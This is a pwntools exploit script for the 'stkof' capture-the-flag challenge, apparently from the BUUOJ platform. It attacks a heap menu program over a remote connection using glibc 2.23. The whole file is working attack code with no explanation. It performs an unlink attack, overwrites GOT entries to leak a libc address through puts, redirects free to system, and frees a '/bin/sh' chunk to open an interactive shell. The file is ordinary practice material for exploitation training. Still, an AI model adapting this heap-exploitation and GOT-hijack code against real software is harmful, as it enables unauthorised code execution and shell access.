from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

elf = ELF('./stkof')
ld = ELF('./2.23-0ubuntu11.3_amd64/ld-2.23.so')
libc = ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')
remote_libc = ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')
#sh = process(elf.path)
#sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : remote_libc.path})
sh = remote("node4.buuoj.cn", 25525)

strlen_got = elf.got['strlen']
free_got = elf.got['free']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']
strlen_got = elf.got['strlen']
ptr_to_heap = 0x602140


#gdb.attach(sh)

def add(size):
    sh.sendline('1')
    sh.sendline(str(size))
    sh.recvuntil('OK')
 
def dele(idx):
    sh.sendline('3')
    sh.sendline(str(idx))
 
def edit(idx, size, cont):
    sh.sendline('2')
    sh.sendline(str(idx))
    sh.sendline(str(size))
    sh.send(cont)
    sh.recvuntil('OK')

def show(idx):
    sh.sendline('4') 
    sh.sendline(str(idx))
    sh.recvuntil('OK')

add(0x100)
add(0x30)
add(0x80)
payload = p64(0) + p64(0x20) + p64(ptr_to_heap + 0x10 - 0x18) + p64(ptr_to_heap + 0x10 - 0x10)
payload += p64(0x20) + b'a' * 8
payload += p64(0x30) + p64(0x90)
edit(2, len(payload), payload)
dele(3)
payload = b'a' * 8 + p64(strlen_got) + p64(puts_got) + p64(free_got)
edit(2, len(payload), payload) 
payload = p64(puts_plt)
edit(0, len(payload), payload)
#gdb.attach(sh)
show(1)
puts_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.success("puts addr:" + hex(puts_addr))
libc_base = puts_addr - remote_libc.sym['puts']
log.success("libc_base : " + hex(libc_base))
system_addr = libc_base + remote_libc.sym['system']
str_bin_sh = libc_base + next(remote_libc.search(b'/bin/sh'))
log.success("system addr : " + hex(system_addr))
log.success("str_bin_sh : " + hex(str_bin_sh))
payload = p64(system_addr)
edit(2, len(payload), payload)
add(0x80)
payload = '/bin/sh\x00\x00\x00'
edit(4, len(payload), payload)
#gdb.attach(sh)
dele(4)
#sh.send(p64(str_bin_sh))







sh.interactive()

